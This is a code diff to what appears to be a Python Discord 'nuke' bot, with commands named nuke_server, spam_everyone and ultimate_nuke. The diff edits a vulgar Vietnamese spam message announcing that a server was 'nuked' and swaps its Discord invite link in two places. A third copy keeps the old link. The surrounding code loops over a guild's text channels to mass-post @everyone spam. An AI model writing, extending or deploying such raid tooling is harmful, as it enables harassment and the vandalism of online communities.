@@ -384,8 +384,8 @@ async def nuke_server(ctx):
             except:
                 continue
 
-        # Nội dung spam đã được thay thế bằng link mời mới
-        spam_content = "@everyone # SEVER ÓC CẶC ĐÃ BỊ NUKE BỞI BẢO ĐZ\nlink sv: https://discord.gg/pwgw9UVvB5"
+        # Nội dung spam theo đúng yêu cầu
+        spam_content = "@everyone # SEVER ÓC CẶC ĐÃ BỊ NUKE BỞI BẢO ĐZ\nlink sv: https://discord.gg/2FKg4SugY"
 
         for channel in ctx.guild.text_channels:
             try:
@@ -473,8 +473,7 @@ async def spam_channels_error(ctx, error):
 @is_bot_owner()
 async def spam_everyone(ctx):
     try:
-        # Nội dung spam đã được thay thế bằng link mời mới
-        spam_content = "@everyone # SEVER ÓC CẶC ĐÃ BỊ NUKE BỞI BẢO ĐZ\nlink sv: https://discord.gg/pwgw9UVvB5"
+        spam_content = "@everyone # SEVER ÓC CẶC ĐÃ BỊ NUKE BỞI BẢO ĐZ\nlink sv: https://discord.gg/2FKg4SugY"
 
         embed = discord.Embed(
             title="🚀 KÍCH HOẠT SPAM @EVERYONE",
@@ -918,7 +917,6 @@ async def ultimate_nuke(ctx):
         except:
             pass
 
-        # Nội dung spam đã được thay thế bằng link mời mới
         spam_content = "@everyone # SEVER ÓC CẶC ĐÃ BỊ NUKE BỞI BẢO ĐZ\nlink sv: https://discord.gg/pwgw9UVvB5"
         for channel in ctx.guild.text_channels:
             try:
